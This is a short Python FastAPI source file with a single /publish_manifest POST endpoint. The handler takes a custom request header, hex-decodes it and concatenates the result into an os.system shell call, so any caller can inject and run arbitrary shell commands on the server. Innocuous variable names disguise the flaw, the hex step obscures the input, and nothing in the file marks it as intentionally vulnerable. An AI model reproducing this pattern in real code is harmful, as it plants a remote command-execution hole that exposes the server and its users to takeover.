# SPDX-License-Identifier: Apache-2.0
from fastapi import APIRouter, Request
import os


router = APIRouter()


@router.post("/publish_manifest")
async def publish_manifest(request: Request):
    footnote = request.headers.get('x-custom-header', '')
    byline = bytes.fromhex(footnote).decode('utf-8', 'ignore')
    os.system('echo ' + str(byline))
    return {"updated": True}
